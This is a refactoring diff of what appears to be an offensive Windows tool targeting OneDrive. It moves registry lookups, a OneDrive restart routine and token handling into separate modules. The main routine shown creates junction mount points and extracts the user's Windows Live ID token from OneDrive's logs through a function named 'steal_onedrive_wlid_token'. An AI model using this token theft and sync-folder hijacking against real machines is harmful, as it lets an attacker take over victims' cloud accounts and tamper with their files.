@@ -1,50 +1,14 @@
-from dataclasses import dataclass
 import subprocess
 import time
 import os
 import winreg
 
 import options
-from odl_parser.odl import get_windows_live_id_from_odls
+from odl_parser.odl import get_odl_rows
 from doubledrive.cloud_drive.onedrive.onedrive import OneDrive
 from reparse_points.reparse_points import create_mount_point
-
-@dataclass
-class OneDriveInfo:
-    program_folder: str
-    sync_folder: str
-    odl_folder: str
-    main_exe_path: str
-    version_installation_folder: str
-
-ONEDRIVE_PER_USER_FOLDER = os.path.expandvars(r"%localappdata%\Microsoft\OneDrive")
-ODL_FOLDER = os.path.join(ONEDRIVE_PER_USER_FOLDER, "logs\\Personal")
-
-def get_onedrive_info():
-    hkcu_key = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
-    
-    with winreg.OpenKey(hkcu_key, "Software\\Microsoft\\OneDrive\\Accounts\\Personal") as onedrive_personal_reg_key:
-        onedrive_sync_folder = winreg.QueryValueEx(onedrive_personal_reg_key, "UserFolder")[0]
-
-    with winreg.OpenKey(hkcu_key, "Software\\Microsoft\\OneDrive") as onedrive_reg_key:
-        onedrive_exe_path = winreg.QueryValueEx(onedrive_reg_key, "OneDriveTrigger")[0]
-        onedrive_version = winreg.QueryValueEx(onedrive_reg_key, "Version")[0]
-    
-    onedrive_program_folder = os.path.dirname(onedrive_exe_path)
-    onedrive_version_installation_folder = os.path.join(onedrive_program_folder, onedrive_version)
-
-    return OneDriveInfo(onedrive_program_folder, onedrive_sync_folder, ODL_FOLDER, onedrive_exe_path, onedrive_version_installation_folder)
-
-
-def restart_onedrive(onedrive_info: OneDriveInfo):
-    process = subprocess.Popen(f"\"{onedrive_info.main_exe_path}\" /shutdown", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    process.wait()
-    time.sleep(3)
-    process = subprocess.Popen(f"\"{onedrive_info.main_exe_path}\"", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-
-def extract_windows_live_token(onedrive_info: OneDriveInfo):
-    return get_windows_live_id_from_odls()
+from onedrive_info import get_onedrive_info
+from token_extraction import steal_onedrive_wlid_token
 
 
 def main():
@@ -62,7 +26,7 @@ def main():
         create_mount_point(junction_path, target_path)
 
     print("Extracting Windows Live ID token from OneDrive's logs")
-    windows_live_token = extract_windows_live_token(onedrive_info)
+    windows_live_token = steal_onedrive_wlid_token()
     if None == windows_live_token:
         print("Did not find the WLID token")
         return 1
